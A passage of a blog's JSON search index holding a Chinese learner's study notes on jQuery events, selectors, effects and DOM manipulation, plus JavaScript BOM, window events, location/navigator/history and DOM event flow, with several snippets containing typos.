on可以实现事件委托\n$(\"ul\").on(\"click\",\"li\",function(){\n    alert(11);\n})\n//click 是绑在ul身上的 但是触发的对象是 ul 里面的小li\n\n//优势3 on可以给未来动态规划创建元素绑定事件\n$(\"ol li\").click(function(){\n    alert(11);  //因为还没有创建 所以没有办法实现\n})\n\n$(\"ol\").on(\"click\",\"li\",function(){\n    alert(11); //可以弹出弹窗\n})\n\nvar li = $(\"<li>这是现在才加入的li<li>\");\n$(\"ol\").sppend(li);\n\n~~~\n\n##### 2.2事件处理off()解绑事件\n\noff()方法可以移除通过on()方法添加的事件处理程序\n\n~~~javascript\n$(\"p\").off() //解绑p元素的所有事件处理程序\n\n$(\"p\").off(\"click\") //解绑p元素上面的点击事件 后面的fn是监听函数名\n\n$(\"ul\").off(\"click\",\"li\") //解绑事件委托\n~~~\n\n<font color=\"red\"> 如果有的事件只想触发一次，可以使用one()来绑定事件</font>\n\n~~~javascript\n//1.事件解绑 off\n$(\"ul\").off(\"click\"); //解绑ul元素上面的点击事件\n$(\"ul\").off(\"click\",\"li\") ;\n//2.one()但是它只能触发事件一次\n$(\"p\").one(\"click\",function(){\n    alert(11);\n})\n~~~\n\n##### 2.3自动触发事件trigger()\n\n~~~javascript\n//1.元素.事件()\n$(\"div\").click(); //会触发元素的默认行为\n\n//2.元素 .trigger(\"事件\")\n$(\"div\").trigger(\"focus\"); //会触发元素的默认行为\n$(\"input\").trigger(\"focus\"); //其默认行为 光标闪烁\n\n//3.元素.triggerHandler(\"事件\") 就是不会触发元素默认行为\n$(\"div\").triggerHandler(\"click\");\n$(\"input\").on(\"focus\",function(){\n    $(this).val(\"你好\");\n})\n~~~\n\n#### 3.jQuery事件对象\n\n事件被触发，就会有事件对象的产生\n`element.on(events,[selector],function(event){})`\n阻止默认行为：`event.preventDefault() / return false`\n阻止冒泡: `event.stopPropagation()`\n\n~~~javascript\n$(document).on(\"click\",function(){\n    console.log(\"点击了document\");\n})\n$(\"div\").on(\"click\",function(event){\n    console.log(\"点击了div\");\n    event.stopPropagation();  //if没有这个代码，则这个div点击后 会冒泡 上面的document也会打印出来\n})\n~~~\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["jQuery"],"categories":["learningNotes"]},{"title":"02 jQuery常用API","url":"/learningNotes/jquery/02jQuery常用API","content":"\n\n####  1 jQuery选择器\n\n##### 1.1jQuery基础选择器\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XkYXF.png\" style=\"zoom:80%;\" align=\"left\" />\n\n##### 1.2层级选择器\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XkTpW.png\" style=\"zoom:60%;\" align=\"left\"  />\n\n##### 1.3.1 知识铺垫—jQuery设置样式\n\n~~~javascript\n $(\"div\").css('属性','值')\n~~~\n\n~~~html\n<div>div1</div>\n<div>div2</div>\n<div>div3</div>\n<script>\n    //1.获取四个div文件\n    console.log($(\"div\"));\n    \n    //2.给四个div文件设置背景  jQuery对象不能应style\n    $(\"div\").css(\"background\",\"pink\");\n    //隐式迭代 就是把所有匹配的所有元素内部进行遍历循环 给每一个元素都添加css这个方法\n</script>\n~~~\n\n##### 1.3.2 隐式迭代\n\n遍历内部 DOM 元素，以为数组形式存储的过程就叫做 隐式迭代。\n即：给匹配到的所有元素进行循环遍历，执行相应的方法\n\n##### 1.4 jQuery 筛选选择器\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XkcFy.png\" style=\"zoom:55%;\" align=\"left\" />\n\n```html\n<!-- 二级导航 -->\n<ul class=\"nav\"> \n    <li>   <!-- 一级导航 -->\n        <ul> <!-- 二级导航-->\n        </ul> \n    </li> \n    <!-- ...-->\n</ul>\n\n<script>\n    $(function(){  //jQuery入口函数\n        //鼠标经过\n        $(\".nav>li\").mouseover(function(){\n            //$(this) jQuery 当前元素 this 不加引号\n            //show()显示元素 hide()隐藏元素\n            $(this).children(\"ul\").show();\n        })\n        //鼠标离开\n        $(\".nav>li\").mouseout(function(){\n            $(this).children(\"ul\").hide();\n        })\n    })\n</script>\n```\n\n\n\n##### 1.5jQuery 筛选方法\n\n<img src=\"https://s1.328888.xyz/2022/04/09/Xk3ld.png\" style=\"zoom:67%;\" align=\"left\" />\n\n**注:** **1. **兄弟元素siblings 除了自身元素之外的所有亲兄弟\n\n~~~javascript\n$(\"ol .item\").siblings(\"li\").css(\"color\",\"red\");\n~~~\n\n  **2.**第n个元素\n\n~~~javascript\nvar index=2;\n//1.选择器\n$(\"ul li:eq(2)\").css(\"color\",\"blue\");\n$(\"ul li:eq(\"+index+\")\").css(\"color\",\"blue\");\n//2.选择方法\n$.(\"ul li\").eq(2).css(\"color\",\"blue\");\n$(\"ul li\").eq(index).css(\"color\",\"blue\")v;\n~~~\n\n**3.**判断是否有某个类名\n\n~~~javascript\nconsole.log($(\"div:first\").hasClass(\"current\"));\n~~~\n\n**4.**父子兄关系的获取\n\n~~~javascript\n//1.父 parent() 返回 最近一级的父级元素 亲爸爸\nconsole.log($(\".son\").parent());\n//2.子 亲儿子 children() 子代选择器 ul>li \n$(\".nav\").children(\"p\").css(\"color\",\"red\");\n//     所有孩子 find() 后代选择器\n$(\".nav\").find(\"p\").css(\"color\",\"red\");\n~~~\n\n**5.**返回指定数组的祖先元素\n\n~~~html\n<div class=\"one\">\n    <div class=\"two\">\n        <div class=\"three\">\n            <div class=\"four\"></div>\n        </div>\n    </div>\n</div>\n<script>\n    console.log($(\".four\").parent().parent().parent());\n    console.log($(\".four\").parents()); //伪数组的形式\n    console.log($(\".four\").parents(\".one\"));  //指定.one\n</script>\n~~~\n\n\n\n##### 1.6jQuery 的排他思想\n\n利用兄弟关系\n\n~~~javascript\n//1.隐式迭代 给所有的按钮的绑定了点击事件\n$(\"button\").click(function(){\n    //2.当前背景元素发生变化\n    $(this).css(\"background\",\"pink\");\n    //3.其他兄弟去掉背景颜色\n    $(this).siblings(\"button\").css(\"background\",\"\");\n})\n~~~\n\n<font size=3 color=\"red\">jQuery得到当前元素的索引号   $(this).index</font>\n\n#### 2.jQuery的样式操作\n\n##### 2.1 操作css方法\n\n~~~javascript\n$(\"div\").css(\"width\",\"300px\");\n$(\"div\").css(\"width\",300);\n//属性名 一定得加引号 否则会被认为是变量\n\n$(\"div\").css({\n    width:400,\n    height:400px;\n    backgroundColor:\"red\";\n})\n~~~\n\n##### 2.2设置类样式方法\n\n~~~javascript\n$(function(){\n    //1.添加类 addClass\n    $(\"div\").click(function(){\n        $(this).addClass(\"current\");\n    });\n    //2.删除类 removeClass\n    $(\"div\").click(function(){\n        $(this).removeClass(\"current\");\n    });\n     //3.切换类 toggleClass\n    $(\"div\").click(function(){\n        $(this).toggleClass(\"current\");\n    });\n})\n~~~\n\n~~~javascript\n//实例 点击上面的li 当前的li 添加current 类 其余兄弟移除该类\n$(\".tab_list li\").click(function(){\n    //链式编程操作\n    $(this).addClass(\"current\").siblings().removeClass(\"current\");\n    //2.点击的同时 得到当前li的索引号\n    var index=$(this).index();\n    console.log(index);\n    //3.让下部里面的索引号的item显示，其余的让item隐藏\n    $(\".tab_con .item\").eq(index).show().siblings().hide();\n});\n~~~\n\n##### 2.3类操作与className区别\n\n原生js中className会覆盖元素原来里面的类名\n\njQuery里面类操作只是对指定类进行操作，不影响原先的类名\n\n~~~html\n<div class=\"one\"></div>\n<script>\n    var one=document.querySelector(\".one\");\n    one.className=\"two\";  //这里div的类名只有two\n    \n    $(\".one\").addClass(\"two\"); //这里div的类名 有one two\n    \n    $(\".one\").removeClass(\"one\"); //这里div的类名 只有two(跟上代码一起)\n</script>\n~~~\n\n#### 3.jQuery效果\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XkOP3.png\" style=\"zoom:60%;\" align=\"left\" />\n\n##### 3.1显示隐藏效果\n\n* 显示语法规范\n\n  ~~~javascript\n  show([speed],[easing],[fn])  //fn 回调函数 前面做完了才会 实现的函数\n  ~~~\n\n* 隐藏语法效果\n\n  ~~~javascript\n  hide([speed],[easing],[fn])\n  ~~~\n\n* 显示隐藏切换语法效果\n\n  ~~~javascript\n  toggle([speed],[easing],[fn])\n  ~~~\n\n  \n\n* 显示/隐藏/切换参数\n\n\n~~~javascript\n$(function(){\n    $(\"button\").eq(0).click(function(){\n        $(\"div\").show(1000,function(){\n            alert(1);  //完成前面操作之后 弹出窗口\n        });\n    })\n     $(\"button\").eq(0).click(function(){\n        $(\"div\").hide(1000,function(){\n            alert(1);  //完成前面操作之后 弹出窗口\n        });\n    })\n     $(\"button\").eq(0).click(function(){\n        $(\"div\").toggle();  //一般情况下 我们不加 参数 直接显示隐藏就ok\n    })\n})\n~~~\n\n##### 3.2滑动效果\n\n* 上滑效果语法规范\n\n  ~~~javascript\n  slideDown([speed],[easing],[fn])\n  ~~~\n\n* 下滑效果语法规范\n\n  ~~~javascript\n  slideUp([speed],[easing],[fn])\n  ~~~\n\n* 滑动切换效果语法规范\n\n  ~~~javascript\n  slideToggle([speed],[easing],[fn])\n  ~~~\n\n* 上滑/下滑/切换效果参数\n\n##### 3.3事件切换\n\n* 事件切换语法规范\n\n  ~~~javascript\n  hover([over],out)\n  ~~~\n\n​       over : 鼠标移到元素上要触发的函数（相当于mouseenter）\n\n​       out ：鼠标移出元素要触发的函数（相当于mouseleave）\n\n​       hover就是鼠标经过和离开的复合写法  \n\n ~~~javascript\n  $(\".nav>li\").hover(function(){\n      $(this).children(\"ul\").slideDown(200);\n  },function(){\n      $(this).children(\"ul\").slideUp(200);\n  });\n ~~~\n\n   <font size=3 color=\"red\">事件切换 hover 如果只写一个函数 那么鼠标经过 离开都会触发这个函数</font>\n\n~~~javascript\n$(\".nav>li\").hover(function(){\n    $(this).children(\"ul\").sildeToggle();\n})\n~~~\n\n##### 3.4动画队列及其停止排队方法\n\n1. **动画或效果队列：**动画或者效果一旦触发就会执行，如果多次触发，就造成多个动画或效果排队执行\n\n2. **停止排队：**stop()\n\n   ​          stop()方法用于停止动画或效果\n\n   ​          注：stop()写到动画或者效果的<font size=3 color=\"red\">前面，相当于停止结束上一次的动画</font>\n\n   ~~~javascript\n   $(\".nav>li\").hover(function(){\n       $(this).children(\"ul\").stop().sildeToggle();\n   })\n   ~~~\n\n##### 3.5淡入淡出效果\n\n* 淡入语法规范\n\n  ~~~javascript\n  fadeIn([speed],[easing],[fn])\n  ~~~\n\n* 淡出语法规范\n\n  ~~~javascript\n  fadeOut([speed],[easing],[fn])\n  ~~~\n\n* 淡入淡出切换语法规范\n\n  ~~~javascript\n  fadeToggle([speed],[easing],[fn])\n  ~~~\n\n* 淡入淡出切换参数\n\n* 渐进方式调整到指定的不透明度\n\n  ~~~javascript\n  fadeTo([speed],[opacity],[easing],[fn])\n  ~~~\n\n* 参数\n\n~~~javascript\n$(function(){\n    $(\"button\").eq(0).click(function(){\n        //淡入\n        $(\"div\").fadeIn(1000);\n    });\n    $(\"button\").eq(1).click(function(){\n        //淡入\n        $(\"div\").fadeOut(1000);\n    });\n    $(\"button\").eq(2).click(function(){\n        //淡入\n        $(\"div\").fadeToggle(1000);\n    });\n    $(\"button\").eq(3).click(function(){\n        //淡入\n        $(\"div\").fadeTo(1000,0.5);\n    });\n})\n~~~\n\n~~~javascript\n//突出显示 案例\n$(function(){\n    //鼠标进入的时候，其他的li标签头透明度0.5\n    $(\".wrap li\").hover(function(){\n        $(this).siblings().stop().fadeTo(400,0.5);\n    },function(){\n        //鼠标离开 其他li 透明度改为 1\n        $(this).siblings().stop().fadeTo(400.1);\n    })\n})\n~~~\n\n##### 3.6自定义动画 animate\n\n* 语法\n\n  ~~~javascript\n  animate(params,[speed],[easing],[fn])\n  ~~~\n\n* 参数\n\n~~~javascript\n$(\"button\").click(function(){\n    $(\"div\").animate({\n        left:500,\n        top:300\n    },500);\n})\n~~~\n\n\n#### 4.jQuery属性操作\n\n##### 4.1设置或获取元素固有属性值 prop()\n\n* 获取属性语法：\n\n  `prop(\"属性\")`\n\n* 设置属性语法：\n\n  `prop(\"属性\",\"属性值\")`\n\n~~~html\n<a href=\"\" title=\"都挺好\">都挺好</a>\n<input type=\"checkbox\" name=\"\" id=\"\" checked>\n<script>\n    $(function(){\n        //element.prop(\"属性名\") 获取属性值\n        console.log($(\"a\").prop(\"href\"));\n        $(\"a\").prop(\"title\",\"我们都挺好\");\n        $(\"input\").change(function(){\n            console.log($(this).prop(\"checked\"));\n        })\n    })\n</script>\n       \n~~~\n\n##### 4.2设置或获取元素自定义属性值attr()\n\n* 获取属性：\n\n  `attr(\"属性\") //类似元素getAttribute()`\n\n* 设置属性：\n\n  `attr(\"属性\",\"属性值\") //类似原生setAttribute()`\n\n~~~javascript\nconsole.log($(\"div\"),attr(\"index\"));\n~~~\n\n##### 4.3数据缓存data()\n\ndata()方法可以在指定元素上存取数据，并不会修改DOM元素结构，一旦页面刷新，之前存放的数据都将被移除\n\n* 附加数据语法：\n\n  `data(\"name\",\"value) //向被选择元素附加数据` \n\n* 获取数据语法：\n\n  `data('name') //向被选元素获取数据`\n\n  <font size=3 color=\"red\">可以读取html5自定义属性data-index，得到数字型</font>\n\n\n#### 5.jQuery内容文本值\n\n主要针对元素的内容还有表单的值的操作\n\n* 普通元素内容html() 相当于原生inner HTML\n\n  `html() //获取元素的内容`\n\n  `html(\"内容\") //设置元素的内容`\n\n* 普通元素文本内容text() 相当于原生innerText\n\n  `text() //获取元素的文本内容`\n\n  `text(\"内容\") //设置元素的文本内容`\n\n* 表单元素 val()\n\n  `val() //获取表单的值`\n\n  `val(\"内容\") //设置表单内容`\n\n~~~javascript\n//1. 获取设置元素内容 html() \nconsole.log($(\"div\").html()); //会打印出 标签\n$(\"div\").html(\"123\") 000\n\n//2. 获取设置元素文本内容 text() \nconsole.log($(\"div\").text()); //打印出文本\n$(\"div\").text(\"123\");\n\n//3. 获取设置表单值 val()\nconsole.log($(\"input\").val());\n$(\"input\").val(\"123\");\n~~~\n\n#### 6.jQuery元素操作（遍历、创建、添加、删除）\n\n##### 6.1遍历元素\n\njQuery隐式迭代是对同一类元素做同样的操作，如果想要给同一类元素做不同操作，就需要用到遍历\n\n**语法1：**\n\n~~~javascript\n$(\"div\").each(function(index,domEle){xxx;})\n~~~\n\n* each()方法遍历匹配的每一个元素，主要用DOM处理\n\n* 里面的回调函数有2个参数：index是每个元素的索引号；domEle是每个<font color=\"red\">DOM对象，不是jQuery对象</font>\n\n* <font color=\"red\">所以想要使用jQuery方法，需要给这个dom元素转换为jQuery对象</font>\n\n  ~~~javascript\n  $(function(){\n      var arr=[\"red\",\"green\",\"blue\"];\n      $(\"div\").each(function(i,domEle){\n          //回调函数第一个参数是索引号 可以自己指定索引号名称 \n          console.log(i);\n          //回调函数第二个参数是dom元素对象\n          console.log(domEle);\n          //domEle.css(\"color\"); dom对象没有css方法\n          $(domEle).css(\"color\",arr[i]);\n      })\n  })\n  ~~~\n\n**语法2：**\n\n~~~javascript\n$.each(object,function(index,element){ xxx; })\n~~~\n\n* $.each()方法可用于遍历任何对象，主要用于<font color=\"red\">数据处理，比如数组，对象</font>\n\n* 里面的函数有2个参数：index是每个元素的索引号element遍历内容\n\n  ~~~javascript\n  $.each(arr,function(i,ele){\n      console.log(i);\n      console.log(ele);\n  })\n  \n  $.each({\n      name:\"andy\",\n      age:18\n  },function(i,ele){\n      console.log(i);\n      console.log(ele);    \n  })\n  ~~~\n\n##### 6.2创建元素\n\n**语法：**\n\n~~~javascript\n$(\"<li></li>\"); //动态创建一个li\n~~~\n\n##### 6.3添加元素\n\n1. 内部添加\n\n   ~~~javascript\n   element.append(\"内容\") //把内容放入匹配元素内部  最后面 类似与appendChild\n   \n   element.prepend(\"内容\") //把内容放入匹配元素内部 最前面\n   ~~~\n\n2. 外部添加\n\n   ~~~javascript\n   element.after(\"内容\") //把内容放入目标元素后面\n   \n   element.before(\"内容\") //把内容放入目标元素前面\n   ~~~\n\n   <font color=\"red\">内部添加元素 生成之后 是父子关系</font>\n\n   <font color=\"red\">外部添加元素 生成之后 是兄弟关系</font>\n\n##### 6.4删除元素\n\n**语法：**\n\n~~~javascript\nelement.remove() //删除匹配的元素（本身） 自杀\n\nelement.empty() //删除匹配元素集合中所有子节点 孩子\n\nelement.html(\"\") //清空匹配的元素内容 孩子\n~~~\n\n~~~javascript\n$(function(){\n    //1.创建元素\n    var li=$(\"<li>我是后来创建的li</li>\");\n    //2.添加元素\n    \n    //（1）.内部添加\n\t$(\"ul\").append(li) //把内容放入匹配元素内部  最后面 类似与appendChild\n\t$(\"ul\").prepend(li) //把内容放入匹配元素内部 最前面\n    //（2）.外部添加\n    var div=$(\"<div>我是后妈生的</div>\");\n    $(\".test\").after(div);\n    $(\".test\").before(div);\n    \n    //3.删除元素\n    $(\"ul\").remove(); \n    $(\"ul\").empty();\n    $(\"ul\").html(\"\");\n})\n~~~\n\n#### 7.jQuery尺寸、位置操作\n\n##### 7.1jQuery尺寸\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XkFf2.png\" style=\"zoom:60%;\" align=\"left\" />\n\n~~~html\n<style>\n    div{\n        width:200px;\n        height:200px;\n        background-color:pink;\n        padding:10px;\n        border:15px solid red;\n        margin:20px;\n    }\n</style>\n<script>\n    $(function(){\n        //1.width()/height() 获取设置元素 width和height大小\n        console.log($(\"div\").width()); //200\n        //$(\"div\").width(300);  //300\n        \n        //2.innerWidth() / innerHeight() 获取设置元素 width 和height ＋padding 大小\n        console.log($(\"div\").innerWidth()); //220\n        \n        //3.outerWidth() / outerHeight() 获取设置元素 width 和 height+padding +border 大小\n        console.log($(\"div\").outerWidth()); //250\n        \n        //4.outerWidth(ture) /outerHeight(true) 获取设置 width 和 height+padding+border+margin 大小\n        console.log($(\"div\").outerWidth(true)); //290\n    })\n</script>\n~~~\n\n##### 7.2jQuery位置 \n\n位置主要有三个：offset ()、position()、scrollTop() / scrollLeft() \n\n<img src=\"https://s1.328888.xyz/2022/04/09/XkvGX.png\" style=\"zoom:60%;\" align=\"left\" />\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XkMOC.png\" style=\"zoom:89%;\" align=\"left\" />\n\n<img src=\"https://s1.328888.xyz/2022/04/09/Xkoh1.png\" style=\"zoom:50%;\" align=\"left\" />\n\n~~~javascript\n$(function(){\n    //1.获取设置距离文档的位置(偏移) offset\n    console.log($(\".son\").offset());\n    console.log($(\".son\").offset().top);\n    $(\".son\").offest({\n        top:200,\n        left:200\n    });\n    //2.获取距离大有定位父级位置（偏移）position 如果没有带有定位的父级，则以文档为准\n    //这个方法只能获取 不能设置\n    console.log($(\".son\").position());\n    \n    //3.被卷去的头部 scrollTop() /被卷去的左侧 scrollLeft()\n    //页面滚动事件\n     $(window).scroll(function() {\n        console.log($(document).scrollTop());\n    })\n})\n~~~\n\n~~~html\n<script>\n</script>\n~~~\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["jQuery"],"categories":["learningNotes"]},{"title":"01 jQuery概述","url":"/learningNotes/jquery/01jQuery概述","content":"\n\n\n#### 1 jQurey 概述\n\n##### 1.1 jQuery的概念\n\n jQuery 是一个快速简介的 js 库，其设计宗旨是 “write less，do more”；\n j：js\n Query：查询\n 即是把js中的 dom 操作做了封装，使之可以快速查询使用里面的功能\n\n jquery 封装了js常用的功能代码，优化了 DOM 操作、事件处理、动画设计、ajax交互...\n 学习jq的本质就是学习调用这些方法\n\n\n##### 1.2 jQuery的优点\n\n  + 轻量级\n  + 跨浏览器兼容\n  + 链式编程、隐式迭代\n  + 对事件、样式、动画支持，大大简化了DOM操作\n  + 支持插件扩展开发\n  + 免费开源\n\n  #### 2 jQuery的基本使用\n\n  ##### 2.1 jQuery的下载 \n\n   **官方网址**：https://jquery.com/\n    (下方右使用说明 \n    右边有棕色的“download”，左键点击\n    production jQuery: 生产版本 压缩过 工作用的\n    development jQuery: 开发版本 无压缩\n    选其一 全选ctrl+A 复制 \n    新建一文件 jquery.min.js  粘贴代码)\n\n**版本的区别**\n    + 1x: 兼容IE 678等低版本浏览器，官网不再更新\n    + 2x: 不兼容IE 678等低版本浏览器，官网不再更新\n    + 3x: 不兼容IE 678等低版本浏览器，官方主要更新维护版本\n\n\n  ##### 2.2 jQuery的使用\n\n   把jq引用到html页面中的<head>即可\n\n   ```html\n<script scr=\"jquery.min.js\"></script>\n   ```\n\n\n\n**2.1 2.2用不了的话 用下面**\n\n```java\n//jquery-3.3.1：字节跳动jquery压缩版引用地址: （速度快推荐！）\n<script src=\"https://s3.pstatp.com/cdn/expire-1-M/jquery/3.3.1/jquery.min.js\"></script>\n\n//jquery-3.2.1：字节跳动jquery压缩版引用地址: （速度快推荐！）\n<script src=\"https://s3.pstatp.com/cdn/expire-1-M/jquery/3.2.1/jquery.min.js\"></script>\n\n//jquery-1.11.3：百度压缩版引用地址: \n<script src=\"https://libs.baidu.com/jquery/1.11.3/jquery.min.js\"></script>\n\n//jquery-1.5.2：百度压缩版引用地址:\n<script src=\"https://libs.baidu.com/jquery/1.5.2/jquery.min.js\"></script>\n```\n\n\n\n  ##### 2.3 jQuery的入口函数   \n\n   ```javascript\n $(function(){\n     ...  //此处是页面DOM加载完成的入口\n });  \n   ```\n\n **或者**\n\n   ```javascript\n $(document).ready(function(){\n     ...  //此处是页面DOM加载完成的入口\n });\n   ```\n\n <img src=\"img\\2.3入口函数.png\" style=\"zoom:80%;\" />\n\n   ```javascript\n//使div元素隐藏\n$(function(){\n    $('div').hide();\n})\n   ```\n\n##### 2.4 jQuery的顶级对象$\n\n1. $是jQuery的别称 在代码中可以用jQuery代替\\$\n2. $是jQuery的顶级对象，相当于js中的window，把元素利用￥包装成jQuery对象，就可以调用看query的方法 \n\n##### 2.5.1 jQuery对象和DOM对象\n\n1. DOM对象：用原生js代码获取的对象\n\n   `var myDiv=document.querySelector('div');`\n\n2. jQuery对象：用jQuery方式获取过来的对象  本质：<font color=\"red\">通过$把DOM元素进行包装</font>\n\n   `$('div');`  //获取过来是伪数组的形式\n\n3. <font color=\"red\">jQuery对象只能用jQuery方法  DOM对象只能用原生的js的属性和方法</font>\n\n   两者用`console.dir(myDiv)/console.dir($('div'))`打印出来的结果不一样\n\n##### 2.5.2 jQuery对象和DOM对象的相互转换\n\njQuery对象与DOM对象之间是可以相互转换的，因为原生js比jQuery更大，原生的一些属性和方法jQuery没有封装，if要使用，jQuery对象就得转换为DOM对象\n\n1. DOM对象转换为jQuery对象：<font color=\"red\">$(DOM对象)</font>\n\n   ```html\n   <video src=\"mov.mp4\"></video>\n   <script>\n       $('video'); //直接获取视频，得到jQuery对象\n       var myvideo = document.querySelector('video'); //dom对象\n       \n       //1.dom-->jquery\n       $(myvideo);\n       //.play()方法 播放video js原生方法\n       myvideo.play()  // √\n       //$(myvideo).play() ×   \n   </script>\n   ```\n\n2. jQuery对象转换为DOM对象：\n\n   `$(‘div’)[index]  //index是索引号`\n\n   `$(’div‘).get(index)  //index是索引号`\n\n   ```javascript\n   //往中间插入\n   \n   //2.jQuery对象转换为dom对象\n   $('video')[0].play()  //√  因为$('video')[0]已经是dom对象\n   $('video').get(0).play() //也可\n   ```\n","tags":["jQuery"],"categories":["learningNotes"]},{"title":"js bom对象概述","url":"/learningNotes/js/08 BOM概述","content":"\n\n\n#### 1.什么是BOM\n\nBOM（Browser Object Model）浏览器对象模型，它提供了独立于内容而与浏览器窗口进行交互的对象，其核心对象是 window\n\nBOM 由一系列相关的对象构成，并且每个对象都提供了很多方法和属性。\n\n\n\n#### 2. 与DOM相比\n\n+ DOM\n  + 文档对象模型\n  + DOM 就是把文档当作一个对象来看待\n  + DOM 的顶级对象就是 document\n  + DOM 主要学习的是操作页面元素\n  + DOM 是 W3C 标准规范\n+ BOM\n  + 浏览器对象模型\n  + 把浏览器当作一个对象看待\n  + BOM 的顶级对象是  window\n  + DOM 学习的是浏览器窗口交互的一些对象\n  + BOM 是浏览器厂商再各自浏览器上定义的，兼容性差\n\n#### 3.BOM 的构成\n\n+ document\n+ location\n+ navigation \n+ screen\n+ history\n\nwindow 对象是浏览器的顶级对象，具有：\n\n1. 是js访问浏览器窗口的一个接口\n2. 是一个全局对象，定义在全局作用域中的变量、函数都会变成 window对象的属性和方法\n\n在调用时可以省略window","tags":["js"],"categories":["learningNotes"]},{"title":"js window对象常见事件","url":"/learningNotes/js/09 window对象","content":"\n\n\n### 1. 窗口加载事件：onload、DOMContentLoaded\n\n`onload`: 当文档内容完全加载完成时会触发该事件（包括图像、脚本、css、文件等），就调用的处理函数\n\n`DOMContentLoaded`: 此事件触发时，仅当DOM加载完成，不包括样式表、图片、flash等等   ie9+\n\n> 页面图片很多，从用户访问到onload触发可能需要较长的时间，交互效果就不能实现，此时用DOMContentLoaded比较合适 ，速度较快\n\n触发方式：\n\n+ 传统：`window.onload=function(){}`  只能写一次  多次 以最后一个为准\n+ 监听：`window.addEventListener(\"load\",function(){});` 没有次数限制\t\n\n\n\n### 2. 调整窗口大小事件: onresize\n\n只要窗口发生像素变化就会触发这个事件|  利用此完成响应式布局\n\n\n\n### 3. 定时器：setTimeout、setInterval\n\n+ `window.setTimeout(调用函数，[延迟的毫秒数])`  : 该定时器再定时器到期后执行调用函数\n  + window可以省略\n  + 这个调用函数可以   直接写函数  或者  写函数名  或者  采取字符串'函数名()' 。第三种不推荐\n  + 延迟的毫秒数省略默认是，单位是毫秒\n  + 因为定时器可能有很多，所以经常给定时器赋值一个标识符\n  + 这个函数需要等待时间，时间到了才去调用这个函数，因此称回调函数\n+ `window.clearTimeout(timeout ID)`：停止setTimeout()定时器：\n  + window可以省略   里面的参数就是定时器的标识符\n+ `window.setInterval(回调函数，[间隔的毫秒数])`: 方法重复调用一个函数 ，每隔这个时间  就去调用一次回调函数\n  + window可以省略\t\n  + 这个调用函数可以    直接写函数  或者  写函数名  或者  采取字符串'函数名()'  三种形式\n  + 延迟的毫秒数省略默认是0，if写，必须是毫秒\t\t\n  + 因为定时器可能有很多，所以经常给定时器赋值一个标识符\n\n+ `window.clearInterval(interval ID)`: 停止setInterval()定时器\n  + window可以省略   里面的参数就是定时器的标识符\n\n\n\n\n\n\n\n","tags":["js"],"categories":["learningNotes"]},{"title":"js loaction、navigator、history对象概述","url":"/learningNotes/js/10 location对象","content":"\n### 1. location对象\n\n#### 1.1 概述\n\n用于获取或设置窗体的 url，并且可以用于解析url，应为返回的是一个对象，所以我们将这个属性也称为location对象。\n\n#### 1.2 url 概述\n\n统一资源定位器，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的url，它包含的信息指出文件的位置以及浏览器怎么处理它\n\n一般语法为：`protocol：//host[ : port]/path/[?query]#fragment `\n\n+ `http://www.itcast.c/index.html?name=andy&age=18#link`\n+ 通信协议 — 常用http、ftp、maito\n+ 主机（域名）— www.iteima.com\n+ 端口号 —  可选，省略时使用方案的默认端口  如http的为80\n+ 路径 — 由0或多个/隔开的字符串  一般用来表示主机上的一个目录或文件地址\n+ 参数 — 以键值对的形式  通过&分隔开来\n+ 片段 — #后面内容 常见于两节  锚点\n\n#### 1.3 location 对象的属性\n\n+ `location.href ` —  获取或设置整个url\n+ `location.host` —  返回主机（域名）\n+ `location.port` — 返回端口号   if未写返回  得空字符串\n+ `location.pathname` — 返回路径\n+ `location.search` — 返回参数\n+ `location.hash` — 返回片段\n\n#### 1.4 location 对象的方法\n\n+ `location.assign()`    跟href一样 可以跳转页面（重定向页面） 能后退  \n+ `location.replace()`  替换当前页面  不记录历史 不能后退\t\n+ `location.reload()`    重新加载页面 相当于刷新按钮或者f5 if参数为true 强之刷新  ctrl+5\n\n\n\n### 2.navigator对象\n\n包含有关浏览器的信息，它由很多属性，我们最常用的是userAgent，该属性可以返回由客户机发送服务器的use-agent头部的值\n\n以下前端代码可以判断用户那个终端打开页面 实现跳转\n\n~~~js\nif((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|Webos|Symbian|Windows Phone)/i))){\n\twindow.location.href=\"(页面地址)\";  //手机\n}else{\n\twindow.location.href=\"\"; //电脑\n}\n~~~\n\n### 3. history对象\n\n与历史记录进行交互，该对象包含用户（在浏览器窗口中）访问过的url\n\n+ back()      可以后退功能\n+ forward() 前进功能\n+ go(参数)   前进后退功能  参数是1  前进一个页面  如果是-1  后退1个页面","tags":["js"],"categories":["learningNotes"]},{"title":"js获取元素","url":"/learningNotes/js/05DOM事件流","content":"\n### DOM事件流\n\n  html中的标签都是相互嵌套的，我们可以将元素想象成一个盒子装一个盒子，document是最外面的大盒子。 当你单击一个div时，同时你也单击了div的父元素，甚至整个页面。\n\n> 那么是先执行父元素的单击事件，还是先执行div的单击事件 ？？？\n\n其实：\n\n事件流 描述的是从页面中接收事件的顺序；\n\n事件 发生时会在元素节点之间按照待定的顺序传播，这个传播过程就是 DOM 事件流\n\n> 比如：我们给页面中的一个div注册了单击事件，当你单击了div时，也就单击了body，单击了html，单击了document。\n\n<img src=\"https://s1.328888.xyz/2022/04/09/X1ZDZ.png\">\n\n#### 事件冒泡：\n\nIE最早提出，事件开始时由最具体的元素接收，然后逐级向上传播到 DOM 最顶层节点的过程\n\n#### 事件捕获：\n\n网景最早提出，由DOM最顶层节点开始，然后逐层向下传播到最具体的元素接收的过程\n\n>  当时的2大浏览器霸主谁也不服谁！\n>\n>  IE 提出从目标元素开始，然后一层一层向外接收事件并响应，也就是冒泡型事件流。\n>\n>  Netscape（网景公司）提出从最外层开始，然后一层一层向内接收事件并响应，也就是捕获型事件流。\n>\n>  最终，w3c 采用折中的方式，平息了战火，制定了统一的标准 —--— 